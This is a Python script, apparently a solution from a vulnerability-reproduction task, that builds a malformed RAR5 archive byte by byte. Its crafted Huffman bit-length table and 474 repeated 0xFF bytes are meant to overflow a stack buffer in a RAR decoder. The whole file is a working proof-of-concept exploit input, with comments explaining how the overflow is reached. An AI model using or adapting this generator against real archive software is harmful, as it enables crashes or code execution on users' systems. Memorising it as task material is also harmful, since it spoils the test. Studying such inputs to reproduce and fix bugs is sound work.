import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        def write_varint(n):
            res = bytearray()
            while n >= 0x80:
                res.append((n & 0x7f) | 0x80)
                n >>= 7
            res.append(n)
            return res

        def make_block(header_fields):
            # Calculate size of the header fields
            size_data = write_varint(len(header_fields))
            # CRC is computed over the Size varint + Header Fields
            data_to_crc = size_data + header_fields
            crc = zlib.crc32(data_to_crc) & 0xffffffff
            return struct.pack('<I', crc) + data_to_crc

        # 1. RAR5 Signature
        signature = b"\x52\x61\x72\x21\x1a\x07\x01\x00"

        # 2. Main Header (Type 1)
        # Fields: Type(1), Flags(0), ExtraSize(0), ArchiveFlags(0)
        mh_fields = bytearray()
        mh_fields.extend(write_varint(1)) # Type
        mh_fields.extend(write_varint(0)) # Flags
        mh_fields.extend(write_varint(0)) # Extra Size
        mh_fields.extend(write_varint(0)) # Archive Flags
        main_header = make_block(mh_fields)

        # 3. Payload Construction
        # We target a stack buffer overflow in Huffman table decoding.
        # Structure: Bit Length Table (10 bytes) + Main Table Data (Spam)
        
        # Bit Length Table (BLT): 20 entries, 4 bits each.
        # We want to create a Huffman tree where Code '1' maps to Symbol 18.
        # Symbol 18 is "Repeat Zeros".
        # We assign Length 1 to Index 0 and Index 18. All others 0.
        # MSB packing: \x10 -> Index 0 (1), Index 1 (0).
        # We repeat \x00 for indices 2-17.
        # \x10 -> Index 18 (1), Index 19 (0).
        blt = b'\x10' + b'\x00' * 8 + b'\x10'
        
        # Main Data:
        # We want to spam Symbol 18.
        # Code for Symbol 18 is '1' (1 bit).
        # Symbol 18 consumes 7 bits for count. Max count is 127 (bits 1111111).
        # Sequence '1' + '1111111' = '11111111' = 0xFF.
        # Each 0xFF byte produces 138 zeros.
        # 474 bytes * 138 = ~65k zeros, overflowing the stack buffer (typically ~1-2KB).
        spam = b'\xff' * 474
        payload = blt + spam

        # 4. File Header (Type 2)
        fh_fields = bytearray()
        fh_fields.extend(write_varint(2))            # Type
        fh_fields.extend(write_varint(0))            # Flags
        fh_fields.extend(write_varint(0))            # Extra Size
        fh_fields.extend(write_varint(len(payload))) # Data Size
        fh_fields.extend(write_varint(0))            # Attributes
        fh_fields.extend(write_varint(1))            # Compression Info: Method 1 (Fastest)
        fh_fields.extend(write_varint(0))            # Host OS
        fh_fields.extend(write_varint(1))            # Name Length
        fh_fields.extend(b'a')                       # Name
        file_header = make_block(fh_fields)

        # 5. End of Archive Header (Type 5)
        eh_fields = bytearray()
        eh_fields.extend(write_varint(5))            # Type
        eh_fields.extend(write_varint(0))            # Flags
        eh_fields.extend(write_varint(0))            # Extra Size
        end_header = make_block(eh_fields)

        return signature + main_header + file_header + payload + end_header
